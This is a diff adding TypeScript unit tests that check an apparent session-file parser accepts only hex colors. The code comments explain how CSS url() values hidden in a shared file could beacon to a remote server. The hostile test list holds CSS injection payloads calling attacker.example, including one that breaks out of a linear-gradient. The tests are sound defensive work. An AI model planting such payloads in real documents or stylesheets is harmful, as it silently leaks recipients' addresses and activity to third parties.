@@ -214,3 +214,71 @@ describe('4.0 → 5.0 membership migration', () => {
     })
   }
 })
+
+// ── Colors from an untrusted document ─────────────────────────────────────────
+//
+// A stored color is written into a CSS `background`, and CSS backgrounds accept
+// `url(...)`. A shared session file is therefore a place someone could hide a
+// request to a remote server that fires the moment a swatch is painted — the
+// recipient's address and the fact they opened the file, leaked by a color.
+//
+// The parser answers that by admitting only '#rrggbb'. These cases pin that
+// down at the boundary, on both the collection and the element, because the two
+// were validated inconsistently before.
+
+describe('Colors are constrained to hex at the file boundary', () => {
+  const sessionWith = (color: string): string => JSON.stringify({
+    version: '5.0',
+    elements: [{ id: 'e1', name: 'One', color }],
+    collections: [{ id: 'c1', name: 'Group', color }],
+    dimensions: [],
+    scores: {},
+    maps: []
+  })
+
+  const hostile = [
+    'url(https://attacker.example/beacon.png)',
+    'red; background: url(https://attacker.example/b.png)',
+    // Closes the linear-gradient() CollectionChoiceRow builds and adds a layer.
+    'red 0 50%, transparent 50% 100%), url(https://attacker.example/b.png',
+    'image-set(url(https://attacker.example/b.png))'
+  ]
+
+  for (const color of hostile) {
+    it(`refuses ${color.slice(0, 34)}…`, () => {
+      const state = deserializeSession(sessionWith(color))
+      expect(state.elements[0].color).toBe('#9d9d53')
+      expect(state.collections[0].color).toBe('#808080')
+    })
+  }
+
+  it('refuses colors that are valid CSS but not hex', () => {
+    for (const color of ['red', 'rgb(1,2,3)', '#abc', '#12345g', 'transparent']) {
+      const state = deserializeSession(sessionWith(color))
+      expect(state.elements[0].color).toBe('#9d9d53')
+      expect(state.collections[0].color).toBe('#808080')
+    }
+  })
+
+  it('refuses a color that is not a string at all', () => {
+    const state = deserializeSession(JSON.stringify({
+      version: '5.0',
+      elements: [{ id: 'e1', name: 'One', color: { toString: 'url(x)' } }],
+      collections: [{ id: 'c1', name: 'Group', color: 42 }],
+      dimensions: [], scores: {}, maps: []
+    }))
+    expect(state.elements[0].color).toBe('#9d9d53')
+    expect(state.collections[0].color).toBe('#808080')
+  })
+
+  it('keeps real hex colors exactly, in either case', () => {
+    const state = deserializeSession(JSON.stringify({
+      version: '5.0',
+      elements: [{ id: 'e1', name: 'One', color: '#AbCdEf' }],
+      collections: [{ id: 'c1', name: 'Group', color: '#4080c0' }],
+      dimensions: [], scores: {}, maps: []
+    }))
+    expect(state.elements[0].color).toBe('#AbCdEf')
+    expect(state.collections[0].color).toBe('#4080c0')
+  })
+})
